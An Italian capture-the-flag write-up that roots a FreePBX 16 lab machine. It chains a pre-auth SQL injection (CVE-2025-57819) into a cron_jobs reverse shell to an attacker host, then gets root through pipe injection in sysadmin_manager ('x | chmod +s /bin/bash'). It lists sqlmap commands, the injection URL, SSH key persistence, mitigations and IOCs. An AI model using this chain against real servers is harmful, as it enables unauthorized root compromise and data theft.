```txt
  _____                            _           _ 
 / ____|                          | |         | |
| |     ___  _ __  _ __   ___  ___| |_ ___  __| |
| |    / _ \| '_ \| '_ \ / _ \/ __| __/ _ \/ _` |
| |___| (_) | | | | | | |  __/ (__| ||  __/ (_| |
 \_____\___/|_| |_|_| |_|\___|\___|\__\___|\__,_|
                                                 
                                                 
===============================================================================

----[ 0x00 ]  DISCLAIMER
-------------------------------------------------------------------------------
Questo documento è esclusivamente a scopo educativo in ambiente di laboratorio
(HTB). Non riprodurre tecniche o procedure su sistemi non autorizzati.

----[ 0x01 ]  ABSTRACT
-------------------------------------------------------------------------------
Target:   Connected (HTB / lab) — connected.htb
Autore:   Francesco Caligiuri
Lingua:   IT

Sommario: un centralino FreePBX 16 esposto sul web è vulnerabile a una SQL
injection non autenticata nel modulo Endpoint (CVE-2025-57819). Un parametro
consente solo lettura (error-based), un altro consente stacked queries: si
inserisce un job nella tabella `cron_jobs`, eseguito dallo scheduler di FreePBX
come utente `asterisk` → reverse shell. L'escalation sfrutta l'infrastruttura
di hook di sistema (incron + `sysadmin_manager`, eseguito da root): il filtro sui
parametri dimentica la pipe `|`, che permette di iniettare un comando arbitrario
nella `system()` finale → bash SUID.

----[ 0x02 ]  THREAT MODEL & SCOPE
-------------------------------------------------------------------------------
Attore:    Attaccante di rete con accesso HTTP/HTTPS al portale FreePBX.
Assunti:   Nessuna credenziale; porte 22/80/443 aperte.
Obiettivo: Ottenere root sul sistema e leggere /root/root.txt.
Esclusioni: Persistence, lateral movement, data exfil oltre la flag.

----[ 0x03 ]  ENUMERAZIONE INIZIALE
-------------------------------------------------------------------------------
Port scan:
    nmap -p- --min-rate 5000 connected.htb
    nmap -p 22,80,443 -sV -oN connected_fullscan.txt connected.htb

Risultati rilevanti:
    22/tcp  open  ssh        OpenSSH 7.4
    80/tcp  open  http       Apache 2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
    443/tcp open  ssl/https  Apache 2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

Stack datato: CentOS 7, Apache 2.4.6, PHP 7.4 (EOL).

Fuzzing directory/file:
    SL=~/SecLists/Discovery/Web-Content
    ffuf -u http://connected.htb/FUZZ -w $SL/raft-medium-directories.txt -ac -ic
    ffuf -u http://connected.htb/FUZZ -w $SL/raft-small-words.txt \
         -e .php,.txt,.bak,.old,.zip -ac -ic

    /admin  → 301   pannello amministrativo FreePBX
    /ucp    → 301   User Control Panel FreePBX
    /robots.txt → 200

Il pannello si identifica come FreePBX 16.0.40.7.

----[ 0x04 ]  ANALISI APPLICAZIONE E SUPERFICIE DI ATTACCO
-------------------------------------------------------------------------------
FreePBX è un front-end PHP per Asterisk. Su questa versione nuclei segnala
la SQLi pre-auth del modulo Endpoint:

    nuclei -ut
    nuclei -u http://connected.htb -tags freepbx

    [CVE-2025-57819:sqli] [critical]
    http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax
      &command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT(
      '~USER:',(SELECT+USER()),'~'))+--+   ["freepbxuser@localhost"]

Endpoint: /admin/ajax.php — handler `endpoint\ajax`, comando `model`.
I parametri `brand` e `template` finiscono in query SQL senza binding.

----[ 0x05 ]  VULNERABILITÀ (ROOT CAUSE) — FOOTHOLD
-------------------------------------------------------------------------------
- L'handler AJAX del modulo Endpoint è raggiungibile senza autenticazione.
- I parametri `brand`/`template` vengono concatenati nella query SQL.
- `brand`   → iniettabile error-based (EXTRACTVALUE): SOLA LETTURA.
- `template`→ iniettabile con stacked queries (`;`): SCRITTURA nel DB.
- Il DB `asterisk` contiene la tabella `cron_jobs`, i cui comandi vengono
  eseguiti periodicamente da `fwconsole job --run` come utente `asterisk`.

In breve: **SQLi pre-auth** + **stacked queries** + **scheduler che esegue
comandi dal DB** ⇒ **RCE come asterisk**.

----[ 0x06 ]  ENUMERAZIONE DEL DB (SQLMAP)
-------------------------------------------------------------------------------
    URL="http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x"
    BASE="-u $URL -p brand --dbms=mysql --technique=E --batch"

    sqlmap $BASE --dbs                           # asterisk, asteriskcdrdb
    sqlmap $BASE -D asterisk --tables            # 361 tabelle
    sqlmap $BASE -D asterisk -T ampusers --dump  # admin : <sha1>
    sqlmap $BASE -D asterisk -T freepbx_settings -C keyword,value \
           --where "keyword='AUTHTYPE'" --dump   # usermanager

Osservazioni:
- L'hash SHA1 di `admin` in `ampusers` non è in rockyou (hashcat -m 100).
- AUTHTYPE = usermanager → il login /admin non usa comunque `ampusers`.
- `userman_users` e le tabelle token/sessioni sono vuote.
- `manager` contiene i secret AMI (in chiaro) — non necessari alla catena.
- L'utente DB ha solo USAGE (no FILE): `--os-shell` non praticabile.

Verifica del secondo punto d'iniezione (scrittura):
    sqlmap -u "$URL" --technique=S --dbms=mysql --batch
    → Parameter: template (GET)  Type: stacked queries
      template=x';SELECT SLEEP(5)#

----[ 0x07 ]  EXPLOIT — RCE VIA CRON_JOBS
-------------------------------------------------------------------------------
Listener attaccante:
    nc -lvnp 4444

PoC pubblico (CVE-2025-57819): inserisce via stacked query una riga in
`asterisk.cron_jobs` con una reverse shell come comando; lo scheduler la
esegue entro ~60s.

    uv run --with requests --with rich 52681.py \
        -u http://connected.htb --lhost <ATTACKER_IP> --lport 4444

    [+] Exploit path confirmed!
    [*] Injecting payload into cron schedule...
    [+] Payload planted successfully

Shell ottenuta come `asterisk`.

Stabilizzazione con chiave SSH:
    # attaccante
    ssh-keygen -t ed25519 -f ~/.ssh/connected -C connected
    # target
    mkdir -p ~/.ssh && chmod 700 ~/.ssh
    echo '<contenuto connected.pub>' >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    # attaccante
    ssh -i ~/.ssh/connected asterisk@connected.htb

----[ 0x08 ]  POST-EXPLOIT (USER FLAG)
-------------------------------------------------------------------------------
    id
    uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
    cat ~/user.txt
    [REDACTED]

----[ 0x09 ]  ENUMERAZIONE PRIVILEGI (LINPEAS)
-------------------------------------------------------------------------------
Finding rilevanti:
- /usr/bin/incrontab      SUID root, "Unknown SUID binary!"
- incrond                 in esecuzione come root
- Regole incron attive (eseguite da root):
    /usr/local/asterisk/incron  IN_CLOSE_WRITE  /usr/bin/sysadmin_manager --local $#
    /var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
- /usr/local/asterisk/incron   drwxrwxrwx (scrivibile da chiunque)

Falsi positivi scartati:
- pkexec / PwnKit (CVE-2021-4034): binario datato 25/01/2022, già patchato.
- sudo 1.8.23: solo "candidate", asterisk non ha regole sudo.

----[ 0x0A ]  ANALISI DI SYSADMIN_MANAGER
-------------------------------------------------------------------------------
`/usr/bin/sysadmin_manager` (PHP) è l'hook service di FreePBX invocato da
incron come root. Flusso:

1. Prende il nome del file creato nella cartella sorvegliata ($#).
2. Lo parsa come `modulo.hook[.params]` (o `modulo_hook`).
   Se params == "CONTENTS", i parametri vengono letti dal contenuto del file.
3. Verifica che il modulo abbia un module.sig firmato GPG da una chiave in
   whitelist e che l'hook sia elencato nella firma con hash sha256 corretto.
4. Sanifica i parametri:

       if (preg_match('/[^\x20-\x7e]/', $params)) exit;   // solo stampabili
       if (preg_match('/[`\'"$><&;]/', $params))  exit;   // blocklist

5. Esegue:

       system("$hookfile $params");

I controlli di firma impediscono di eseguire hook arbitrari, ma non di
eseguire un hook legittimo con parametri controllati dall'attaccante.

----[ 0x0B ]  VULNERABILITÀ (ROOT CAUSE) — PRIVESC
-------------------------------------------------------------------------------
- La blocklist dei parametri vieta ` ' " $ > < & ; ma NON la pipe `|`.
- I parametri finiscono non quotati dentro `system()` eseguita da root.
- La cartella sorvegliata /usr/local/asterisk/incron è world-writable.

In breve: **trigger incron scrivibile** + **blocklist incompleta** +
**system() con parametri non quotati** ⇒ **command injection come root**.

Nota: l'hook `filestore/addpubkey` (scrive in /root/.ssh/authorized_keys)
sembra la via prevista, ma appende la chiave senza newline e il filtro
non permette di iniettarne uno: la chiave si incolla alla riga precedente
e non viene accettata. La pipe rende superfluo quel percorso.

----[ 0x0C ]  ESCALATION: PIPE INJECTION IN SYSADMIN_MANAGER
-------------------------------------------------------------------------------
Verifica della catena con un hook innocuo e firmato (output leggibile):
    cd /usr/local/asterisk/incron
    : > 'sysadmin.dump-iptables'
    ls -la /tmp/iptables-save-output
    -rw-r--r-- 1 root root 7377 ... /tmp/iptables-save-output   # eseguito da root

Payload (params da CONTENTS, perché contiene `/`):
    cd /usr/local/asterisk/incron
    printf '%s' 'x | chmod +s /bin/bash' > 'sysadmin.dump-iptables.CONTENTS'

Root esegue:
    /var/www/html/admin/modules/sysadmin/hooks/dump-iptables x | chmod +s /bin/bash

Root shell:
    ls -la /bin/bash
    -rwsr-sr-x. 1 root root 964536 ... /bin/bash
    /bin/bash -p
    id
    uid=999(asterisk) gid=1000(asterisk) euid=0(root) egid=0(root) ...
    cat /root/root.txt
    [REDACTED]

----[ 0x0D ]  CATENA D’ATTACCO (TIMELINE)
-------------------------------------------------------------------------------
1. Recon → FreePBX 16 su 80/443
2. nuclei → CVE-2025-57819 (SQLi pre-auth, modulo Endpoint)
3. sqlmap → `brand` error-based (lettura), `template` stacked (scrittura)
4. INSERT in cron_jobs → scheduler → reverse shell come asterisk
5. Chiave SSH → accesso stabile, user flag
6. linpeas → incrontab SUID, incrond root, cartella incron 777
7. Lettura di sysadmin_manager → blocklist senza `|`
8. Hook firmato + params via CONTENTS → `chmod +s /bin/bash` come root
9. bash -p → root flag

----[ 0x0E ]  MITIGAZIONI
-------------------------------------------------------------------------------
- FreePBX:
  * Aggiornare il modulo Endpoint (fix CVE-2025-57819)
  * Non esporre /admin su Internet; restringere per IP / VPN
- sysadmin_manager:
  * Passare i parametri con escapeshellarg() o via exec array, non system()
  * Usare una allowlist di caratteri invece di una blocklist
- Sistema:
  * Cartelle incron non world-writable (owner root, 0755)
  * Rimuovere il bit SUID da incrontab se non necessario

----[ 0x0F ]  IOCs / ARTEFATTI (LAB)
-------------------------------------------------------------------------------
- Righe anomale in asterisk.cron_jobs (reverse shell verso <ATTACKER_IP>:4444)
- Richieste GET a /admin/ajax.php?module=...endpoint...&brand=/template= con SQL
- Chiave ed25519 "connected" in ~asterisk/.ssh/authorized_keys
- File sysadmin.dump-iptables.CONTENTS creati in /usr/local/asterisk/incron
- /bin/bash con bit SUID (ripristinare: chmod -s /bin/bash)

----[ 0x10 ]  SOMMARIO (TL;DR)
-------------------------------------------------------------------------------
- FreePBX 16 → SQLi pre-auth CVE-2025-57819
- Stacked query su `template` → cron_jobs → shell asterisk
- incron + sysadmin_manager come root, blocklist senza `|`
- `x | chmod +s /bin/bash` via hook firmato → bash -p → root

Rooted.

----[ 0x11 ]  RIFERIMENTI & CREDITI
-------------------------------------------------------------------------------
- CVE-2025-57819 — FreePBX Endpoint module, unauthenticated SQLi → RCE
- Advisory FreePBX GHSA-m42g-xg4c-5f3h
- PoC: 52681.py (K3ysTr0K3R)
- Autore: Francesco Caligiuri

===============================================================================
 .: Knowledge, Skillz, Root :.                      .: Stay curious! :.
===============================================================================
```
